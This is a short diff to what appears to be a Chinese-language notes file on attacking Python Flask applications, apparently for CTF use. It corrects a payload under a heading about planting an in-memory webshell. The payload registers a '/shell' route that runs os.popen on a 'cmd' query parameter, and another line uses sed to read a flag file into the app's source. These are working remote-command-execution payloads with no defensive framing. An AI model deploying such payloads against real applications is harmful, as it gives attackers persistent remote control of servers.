@@ -70,7 +70,7 @@ __import__('os').system("sed -i \"s/rce.html/`cat /f*`/\" rce.py")
 #### 4.打内存马
 
 ```python
-app._got_first_request=False;app.add_url_rule('/shell','shel1',lambda:'<pre>{0}</pre>'.format(import_('os').popen(request.args.get('cmd')).read()))
+app._got_first_request=False;app.add_url_rule('/shell','shel1',lambda:'<pre>{0}</pre>'.format(__import__('os').popen(request.args.get('cmd')).read()))
 
 app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen('').read())
 
